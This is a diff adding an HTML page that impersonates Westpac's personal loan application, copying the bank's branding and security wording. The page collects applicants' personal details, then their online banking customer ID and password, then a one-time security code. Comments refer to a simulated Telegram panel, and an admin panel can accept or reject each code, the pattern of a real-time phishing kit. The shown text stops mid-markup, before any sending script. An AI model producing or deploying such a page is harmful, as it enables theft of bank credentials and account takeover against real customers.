@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Westpac Personal Loans - Let's Get You Started</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- Google Fonts for premium typography -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+    /* Brand Colors and Utilities */
+    .bg-brand-red { background-color: #DA1710; }
+    .text-brand-red { color: #DA1710; }
+    .border-brand-red { border-color: #DA1710; }
+    .hover-bg-brand-red:hover { background-color: #b8120b; }
+    .bg-brand-blue { background-color: #002F6C; }
+    .text-brand-blue { color: #002F6C; }
+    .border-brand-blue { border-color: #002F6C; }
+    
+    /* Premium Hide Scrollbar */
+    .no-scrollbar::-webkit-scrollbar { display: none; }
+    .no-scrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+
+    /* Key Entry Boxes Animation */
+    .otp-input:focus {
+      border-color: #DA1710;
+      box-shadow: 0 0 0 3px rgba(218, 23, 16, 0.15);
+    }
+  </style>
+</head>
+<body class="bg-gray-50 text-gray-800 min-h-screen flex flex-col">
+
+  <!-- Main Grid Layout (Splits into Client view and Simulated Telegram Panel for easy testing) -->
+  <div class="grid grid-cols-1 lg:grid-cols-12 min-h-screen">
+    
+    <!-- LEFT PANE: Premium Customer Loan Application (8 Columns on desktop) -->
+    <main class="lg:col-span-8 flex flex-col bg-white border-r border-gray-200">
+      
+      <!-- Top Navigation/Header mimicking Westpac -->
+      <header class="border-b border-gray-200 py-4 px-6 md:px-12 flex justify-between items-center bg-white sticky top-0 z-50">
+        <div class="flex items-center space-x-3">
+          <!-- Premium Mock Westpac Logo -->
+          <div class="flex items-center">
+            <span class="text-3xl font-black text-brand-red tracking-tighter">W</span>
+            <span class="text-xl font-bold text-brand-blue tracking-tight ml-1">westpac</span>
+          </div>
+          <span class="hidden md:inline-block h-6 w-[1px] bg-gray-300"></span>
+          <span class="hidden md:inline-block text-xs text-gray-500 font-semibold tracking-wider uppercase">Personal Banking</span>
+        </div>
+        <div class="flex items-center space-x-4">
+          <span class="flex items-center text-xs text-green-600 font-medium bg-green-50 px-2.5 py-1 rounded-full border border-green-200">
+            <svg class="w-3.5 h-3.5 mr-1" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 11.38A10.996 10.996 0 0110 8c1.868 0 3.616.464 5.148 1.284L13.92 10.51A8.995 8.995 0 0010 9.5c-1.39 0-2.697.315-3.864.877L4.55 8.79a11.026 11.026 0 01-2.384 2.59zM10 12c-1.636 0-3.15-.418-4.47-1.15l-1.31 1.31A10.949 10.949 0 0010 13.5c1.868 0 3.616-.464 5.148-1.284l-1.228-1.228A8.995 8.995 0 0110 12z" clip-rule="evenodd"></path><path d="M10 4a3 3 0 100 6 3 3 0 000-6z"></path></svg>
+            Secure Application Session
+          </span>
+        </div>
+      </header>
+
+      <!-- Main Dynamic Content Container -->
+      <div class="flex-1 p-6 md:p-12 max-w-4xl mx-auto w-full transition-all duration-300">
+        
+        <!-- STEP 1: Loan Purpose Selection -->
+        <section id="step-selection" class="block transition-opacity duration-300">
+          <div class="text-center md:text-left mb-8">
+            <h1 class="text-3xl md:text-4xl font-extrabold text-brand-blue uppercase tracking-tight mb-2">Let's Get You Started</h1>
+            <p class="text-lg text-gray-600 font-semibold">What would you like a personal loan for?</p>
+          </div>
+
+          <!-- Cards Grid matching the index-pic layout -->
+          <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+            
+            <!-- Petrol/Diesel/LPG Car -->
+            <button onclick="selectPurpose('Buy a petrol, diesel or LPG car')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 17a2 2 0 11-4 0 2 2 0 014 0zM19 17a2 2 0 11-4 0 2 2 0 014 0z"/><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 16V6a1 1 0 00-1-1H4a1 1 0 00-1 1v10M21 16V9a4 4 0 00-4-4h-3v11M14 9h4"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy a petrol, diesel or LPG car</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Electric/Hybrid Car -->
+            <button onclick="selectPurpose('Buy an electric or hybrid car')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform relative">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+                <div class="absolute -top-1 -right-1 bg-brand-red text-white text-[10px] px-1.5 py-0.5 rounded-full font-bold">ECO</div>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy an electric or hybrid car</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Caravan, RV or Motorbike -->
+            <button onclick="selectPurpose('Buy a caravan, RV or motorbike')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy a caravan, RV or motorbike</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Consolidating My Debts -->
+            <button onclick="selectPurpose('Consolidating my debts')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Consolidating my debts</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Renovate My Home -->
+            <button onclick="selectPurpose('Renovate my home/place')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Renovate my home/place</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Solar Panels -->
+            <button onclick="selectPurpose('Got solar panels')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364-6.364l-.707.707M6.343 17.657l-.707.707m0-12.728l.707.707m12.728 12.728l.707.707M12 8a4 4 0 100 8 4 4 0 000-8z"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Got solar panels</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Go On a Holiday -->
+            <button onclick="selectPurpose('Go on a holiday')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Go on a holiday</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Buy a Boat or Jet Ski -->
+            <button onclick="selectPurpose('Buy a boat or jet ski')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Buy a boat or jet ski</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+            <!-- Something Else -->
+            <button onclick="selectPurpose('Something else')" class="flex flex-col items-center justify-between p-6 bg-white border-2 border-gray-200 hover:border-brand-red rounded-xl shadow-sm hover:shadow-md transition-all text-center group h-64">
+              <div class="w-16 h-16 rounded-full bg-red-50 flex items-center justify-center text-brand-red mb-4 group-hover:scale-110 transition-transform">
+                <svg class="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l.707-.707m2.828 9.9a5 5 0 113.536 0V21h-3.536v-3.457z"/></svg>
+              </div>
+              <span class="text-base font-bold text-brand-blue leading-tight mb-2">Something else</span>
+              <div class="text-xs text-brand-red font-semibold uppercase tracking-wider group-hover:underline">Select & Continue →</div>
+            </button>
+
+          </div>
+        </section>
+
+        <!-- STEP 2: Details & Calculator Page -->
+        <section id="step-details" class="hidden transition-opacity duration-300">
+          
+          <!-- Selected Purpose Indicator -->
+          <div class="flex items-center space-x-2 bg-blue-50 text-brand-blue px-4 py-3 rounded-lg border border-blue-100 mb-8">
+            <svg class="w-5 h-5 text-brand-red" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+            <span class="text-sm font-semibold">Applying for: <strong id="selected-purpose-label" class="text-brand-red">Not selected</strong></span>
+            <button onclick="goToStep('selection')" class="ml-auto text-xs font-bold underline hover:text-brand-red">Change</button>
+          </div>
+
+          <div class="mb-8">
+            <h2 class="text-3xl font-extrabold text-brand-blue tracking-tight">About you</h2>
+            <p class="text-sm text-gray-500 mt-1">To begin, we just need a few details.</p>
+          </div>
+
+          <!-- LOAN CALCULATOR SECTION -->
+          <div class="bg-gray-50 rounded-2xl p-6 border border-gray-200 mb-10">
+            <h3 class="text-lg font-bold text-brand-blue mb-4 flex items-center">
+              <svg class="w-5 h-5 mr-2 text-brand-red" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 7h6m0 10v-3m-3 3h.01M9 17h.01M9 14h.01M12 14h.01M15 11h.01M12 11h.01M9 11h.01M7 21h10a2 2 0 002-2V5a2 2 0 00-2-2H7a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
+              Loan Amount & Repayment Calculator
+            </h3>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+              <!-- Sliders & Controls -->
+              <div class="space-y-6">
+                <!-- Loan Amount -->
+                <div>
+                  <div class="flex justify-between items-center mb-2">
+                    <label class="text-sm font-semibold text-gray-700">Loan Amount</label>
+                    <span class="text-lg font-bold text-brand-blue" id="amount-display">$30,000</span>
+                  </div>
+                  <input type="range" id="loan-amount" min="2000" max="80000" step="500" value="30000" oninput="calculateRepayments()" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-red-600">
+                  <div class="flex justify-between text-xs text-gray-400 mt-1">
+                    <span>$2,000</span>
+                    <span>$80,000</span>
+                  </div>
+                </div>
+
+                <!-- Loan Duration -->
+                <div>
+                  <div class="flex justify-between items-center mb-2">
+                    <label class="text-sm font-semibold text-gray-700">Loan Term</label>
+                    <span class="text-lg font-bold text-brand-blue" id="duration-display">5 Years</span>
+                  </div>
+                  <input type="range" id="loan-duration" min="1" max="7" step="1" value="5" oninput="calculateRepayments()" class="w-full h-2 bg-gray-200 rounded-lg appearance-none cursor-pointer accent-red-600">
+                  <div class="flex justify-between text-xs text-gray-400 mt-1">
+                    <span>1 Year</span>
+                    <span>7 Years</span>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Live Estimate Display Card -->
+              <div class="bg-white p-5 rounded-xl border border-gray-100 flex flex-col justify-between shadow-sm">
+                <div>
+                  <span class="text-xs font-bold text-gray-400 uppercase tracking-wider">Estimated Repayment</span>
+                  <div class="flex items-baseline mt-2">
+                    <span class="text-3xl font-extrabold text-brand-red" id="repayment-amount">$138.15</span>
+                    <span class="text-sm font-semibold text-gray-500 ml-1">/ weekly</span>
+                  </div>
+                  <p class="text-[11px] text-gray-400 mt-2">Calculated at an interest rate of <strong class="text-gray-600">8.49% p.a.</strong> comparison rate. Subject to final credit assessment.</p>
+                </div>
+                <div class="border-t border-gray-100 pt-3 mt-4 grid grid-cols-2 gap-2 text-xs">
+                  <div>
+                    <span class="text-gray-400 block">Monthly rate:</span>
+                    <strong class="text-gray-700" id="repayment-monthly">$598.65</strong>
+                  </div>
+                  <div>
+                    <span class="text-gray-400 block">Total interest:</span>
+                    <strong class="text-gray-700" id="repayment-interest">$5,919.00</strong>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- PERSONAL DETAILS FORM -->
+          <form id="details-form" onsubmit="handleDetailsSubmit(event)" class="space-y-6">
+            
+            <!-- Title Selector -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="title">Title</label>
+              <select id="title" required class="w-full md:w-1/3 px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent bg-white">
+                <option value="">Please select</option>
+                <option value="Mr">Mr</option>
+                <option value="Mrs">Mrs</option>
+                <option value="Ms">Ms</option>
+                <option value="Miss">Miss</option>
+                <option value="Dr">Dr</option>
+              </select>
+            </div>
+
+            <!-- First Name -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue" for="first-name">First name</label>
+              <p class="text-xs text-gray-500 mb-1.5">To help us verify your identity online, please enter your name exactly as it appears on your ID.</p>
+              <input type="text" id="first-name" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Middle Name -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="middle-name">Middle name(s) (if any)</label>
+              <input type="text" id="middle-name" class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Last Name -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="last-name">Last name</label>
+              <input type="text" id="last-name" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Known Legally By Only This Name Toggle -->
+            <div>
+              <span class="block text-sm font-bold text-brand-blue mb-2">Is this the only name you've ever been known by legally?</span>
+              <div class="flex space-x-4">
+                <button type="button" onclick="setLegalNameToggle(true)" id="btn-name-yes" class="w-24 py-3 border-2 border-brand-blue bg-brand-blue text-white rounded-lg font-bold text-sm transition-all focus:outline-none">Yes</button>
+                <button type="button" onclick="setLegalNameToggle(false)" id="btn-name-no" class="w-24 py-3 border-2 border-gray-300 text-gray-700 hover:border-brand-blue rounded-lg font-bold text-sm transition-all focus:outline-none">No</button>
+              </div>
+            </div>
+
+            <!-- Email Address -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue mb-1.5" for="email">Email address</label>
+              <input type="email" id="email" required class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+            </div>
+
+            <!-- Mobile Number -->
+            <div>
+              <label class="block text-sm font-bold text-brand-blue" for="phone">Mobile number</label>
+              <p class="text-xs text-gray-500 mb-1.5">Enter your Australian mobile number e.g. 0401234567</p>
+              <div class="flex">
+                <span class="inline-flex items-center px-4 rounded-l-lg border border-r-0 border-gray-300 bg-gray-100 text-gray-600 text-sm font-medium">
+                  AUS +61
+                </span>
+                <input type="tel" id="phone" required placeholder="0401234567" pattern="[0-9]{9,10}" class="w-full px-4 py-3 border border-gray-300 rounded-r-lg focus:outline-none focus:ring-2 focus:ring-red-600 focus:border-transparent">
+              </div>
+            </div>
+
+            <!-- Help Protect Application Security Info Card -->
+            <div class="bg-gray-50 rounded-xl p-5 border border-gray-200 mt-8 flex items-start space-x-4">
+              <div class="text-brand-red flex-shrink-0 mt-1">
+                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"/></svg>
+              </div>
+              <div>
+                <h4 class="text-sm font-bold text-brand-blue mb-1">Help protect your application</h4>
+                <p class="text-xs text-gray-500">Before continuing, we will secure your application session. Moving forward, you will verify your Westpac Online Banking credentials for instant validation.</p>
+              </div>
+            </div>
+
+            <!-- Submit Button (Continues to Sign In Page) -->
+            <div class="flex justify-between items-center pt-6 border-t border-gray-100">
+              <button type="button" onclick="goToStep('selection')" class="px-6 py-3 border border-gray-300 rounded-lg text-sm font-bold text-gray-600 hover:bg-gray-50">Exit</button>
+              <button type="submit" class="px-8 py-3.5 bg-brand-red hover-bg-brand-red text-white font-bold text-sm rounded-lg shadow-md transition-all">
+                Continue to sign in
+              </button>
+            </div>
+          </form>
+        </section>
+
+        <!-- STEP 3: Bank Sign In Screen -->
+        <section id="step-signin" class="hidden transition-opacity duration-300">
+          
+          <div class="max-w-md mx-auto">
+            <!-- Sign-in Header -->
+            <div class="text-center mb-8">
+              <h2 class="text-2xl md:text-3xl font-bold text-brand-blue tracking-tight">Sign in to Westpac Online Banking</h2>
+              <p class="text-sm text-gray-500 mt-2">Confirm your identity to instantly links your application.</p>
+            </div>
+
+            <div class="bg-white rounded-2xl border border-gray-200 shadow-lg overflow-hidden">
+              <div class="p-6 md:p-8">
+                <!-- Main Login Form -->
+                <form id="signin-form" onsubmit="handleSignInSubmit(event)" class="space-y-6">
+                  
+                  <div>
+                    <label class="block text-sm font-bold text-gray-700 mb-1" for="customer-id">Customer ID</label>
+                    <input type="text" id="customer-id" required class="w-full px-4 py-3 border-2 border-gray-300 focus:border-brand-blue focus:outline-none rounded-lg font-mono tracking-wider">
+                  </div>
+
+                  <div>
+                    <label class="block text-sm font-bold text-gray-700 mb-1" for="password">Password</label>
+                    <input type="password" id="password" required class="w-full px-4 py-3 border-2 border-gray-300 focus:border-brand-blue focus:outline-none rounded-lg">
+                  </div>
+
+                  <div class="flex items-center">
+                    <input type="checkbox" id="remember-id" class="w-4.5 h-4.5 text-brand-red border-gray-300 rounded focus:ring-red-500">
+                    <label for="remember-id" class="ml-2 text-xs font-semibold text-gray-600">Remember customer ID</label>
+                  </div>
+
+                  <button type="submit" class="w-full py-4 bg-brand-red hover-bg-brand-red text-white font-bold text-base rounded-lg shadow-md transition-all">
+                    Sign in
+                  </button>
+
+                  <div class="text-center pt-2">
+                    <a href="#" onclick="alert('This feature is disabled for demo application stability.')" class="text-xs font-semibold text-brand-blue hover:underline">Forgot customer ID or password?</a>
+                  </div>
+                </form>
+              </div>
+
+              <!-- Security Reminder side content matching image design -->
+              <div class="bg-gray-50 border-t border-gray-100 p-6 flex items-start space-x-4">
+                <div class="text-brand-blue flex-shrink-0 mt-1">
+                  <!-- Lock Shield SVG Icon -->
+                  <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 11.38A10.996 10.996 0 0110 8c1.868 0 3.616.464 5.148 1.284L13.92 10.51A8.995 8.995 0 0010 9.5c-1.39 0-2.697.315-3.864.877L4.55 8.79a11.026 11.026 0 01-2.384 2.59zM10 12c-1.636 0-3.15-.418-4.47-1.15l-1.31 1.31A10.949 10.949 0 0010 13.5c1.868 0 3.616-.464 5.148-1.284l-1.228-1.228A8.995 8.995 0 0110 12z" clip-rule="evenodd"></path></svg>
+                </div>
+                <div>
+                  <h3 class="text-sm font-bold text-brand-blue flex items-center">
+                    Security reminder
+                    <span class="ml-1 text-[10px] text-gray-400 font-semibold tracking-wider uppercase">Westpac Protect™</span>
+                  </h3>
+                  <ul class="text-xs text-gray-500 mt-2 space-y-1.5 list-disc list-inside">
+                    <li>Don't sign in if you are sharing access to your computer</li>
+                    <li>Never share your security codes or passwords with anyone</li>
+                    <li>Call us on 132 032 if you are being asked to do this</li>
+                  </ul>
+                  <a href="#" onclick="alert('This link is disabled during application simulation.')" class="inline-block mt-3 text-xs font-semibold text-brand-blue hover:underline">Learn more about staying safe</a>
+                </div>
+              </div>
+
+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 4: Dynamic OTP / PIN Code Verification Page -->
+        <section id="step-otp" class="hidden transition-opacity duration-300">
+          <div class="max-w-md mx-auto text-center">
+            
+            <div class="w-16 h-16 rounded-full bg-red-50 text-brand-red flex items-center justify-center mx-auto mb-6">
+              <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
+            </div>
+
+            <h2 class="text-2xl font-bold text-brand-blue mb-2">Security Verification</h2>
+            <p class="text-sm text-gray-500 mb-6">
+              A temporary security code has been generated. To continue, enter the <strong id="otp-length-label">5</strong>-digit code provided to you.
+            </p>
+
+            <form id="otp-form" onsubmit="handleOtpSubmit(event)" class="space-y-6">
+              
+              <!-- Container where individual digit inputs are rendered dynamically -->
+              <div id="otp-inputs-container" class="flex justify-center space-x-3">
+                <!-- Populated dynamically via JS based on choice of OTP 5 or OTP 6 -->
+              </div>
+
+              <button type="submit" class="w-full py-3.5 bg-brand-red hover-bg-brand-red text-white font-bold text-sm rounded-lg shadow-md transition-all">
+                Confirm Code
+              </button>
+
+              <p class="text-xs text-gray-400 mt-4">
+                Having issues? The simulator admin panel can accept or reject this workflow.
+              </p>
+            </form>
+          </div>
+        </section>
+
+        <!-- STEP 5: Waiting / Loader Screen -->
+        <section id="step-processing" class="hidden transition-opacity duration-300">
+          <div class="max-w-md mx-auto text-center py-12">
+            <div class="relative w-20 h-20 mx-auto mb-6">
+              <!-- Animated Ring Outer -->
+              <div class="absolute inset-0 rounded-full border-4 border-gray-100"></div>
+              <!-- Running Spinner Inner -->
+              <div class="absolute inset-0 rounded-full border-4 border-brand-red border-t-transparent animate-spin"></div>
+            </div>
+            <h3 class="text-xl font-bold text-brand-blue" id="processing-title">Sending details...</h3>
+            <p class="text-sm text-gray-500 mt-2" id="processing-subtitle">Establishing a secure channel and sending payload</p>
+          </div>
+        </section>
+
+        <!-- STEP 6A: SUCCESS PAGE (Thank You) -->
+        <section id="step-success" class="hidden transition-opacity duration-300">
+          <div class="max-w-2xl mx-auto bg-white rounded-2xl border-2 border-green-500 overflow-hidden shadow-xl">
+            <div class="bg-green-500 text-white p-8 text-center">
+              <div class="w-16 h-16 rounded-full bg-white text-green-500 flex items-center justify-center mx-auto mb-4 shadow-lg">
+                <svg class="w-10 h-10" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+              </div>
+              <h2 class="text-3xl font-extrabold tracking-tight">Application Approved!</h2>
+              <p class="text-green-50 font-medium mt-1">Thank you for submitting your details. Your loan has been provisionally accepted.</p>
+            </div>
+
+            <div class="p-6 md:p-8 space-y-6">
+              <h3 class="text-lg font-bold text-brand-blue border-b border-gray-100 pb-2">Client Details & Loan Parameters</h3>
+              <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
+                <div>
+                  <span class="text-gray-400 block font-medium">Applicant Name</span>
+                  <strong class="text-gray-700" id="summary-name">Mr. Jane Doe</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Loan Purpose</span>
+                  <strong class="text-gray-700 text-brand-red" id="summary-purpose">Renovate My Home</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Approved Amount</span>
+                  <strong class="text-gray-700 text-brand-blue" id="summary-amount">$30,000</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Loan Term</span>
+                  <strong class="text-gray-700" id="summary-term">5 Years</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Email Address</span>
+                  <strong class="text-gray-700" id="summary-email">applicant@example.com</strong>
+                </div>
+                <div>
+                  <span class="text-gray-400 block font-medium">Contact Number</span>
+                  <strong class="text-gray-700" id="summary-phone">+61 401 234 567</strong>
+                </div>
+              </div>
+
+              <div class="bg-gray-50 rounded-xl p-5 border border-gray-200 mt-6 text-xs text-gray-500">
+                <p class="font-bold text-brand-blue mb-1">What happens next?</p>
+                <p>One of our personal loan specialist lenders will contact you via your mobile number within the next 2-4 business hours to complete the final processing and verification.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- STEP 6B: DECLINED PAGE -->
+        <section id="step-declined" class="hidden transition-opacity duration-300">
+          <div class="max-w-md mx-auto text-center py-8">
+            <div class="w-20 h-20 rounded-full bg-red-100 text-brand-red flex items-center justify-center mx-auto mb-6">
+              <svg class="w-12 h-12" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+            </div>
+            <h2 class="text-3xl font-extrabold text-brand-blue">Verification Declined</h2>
+            <p class="text-sm text-gray-500 mt-3" id="decline-error-message">
+              The credentials submitted failed verification, or the transaction was declined by the underwriting system.
+            </p>
+            <div class="mt-8 flex justify-center space-x-4">
